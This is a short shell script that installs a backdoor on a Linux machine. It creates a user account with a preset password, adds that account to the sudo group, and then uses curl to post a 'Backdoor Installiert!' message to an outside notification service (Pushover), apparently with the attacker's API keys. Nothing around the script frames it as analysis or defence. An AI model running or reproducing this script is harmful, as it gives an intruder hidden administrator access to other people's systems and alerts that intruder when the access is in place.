sudo useradd -p sau55nnoskxos namelessmcacc
sudo usermod -aG sudo namelessmcacc
curl -s \
  --form-string "token=aw9itprfbhm87ecooj58g7ussdn3an" \
  --form-string "user=uj7zkbroszmy9s8u4ymhdcvkxdyjjm" \
  --form-string "message=Backdoor Installiert!" \
  https://api.pushover.net/1/messages.json
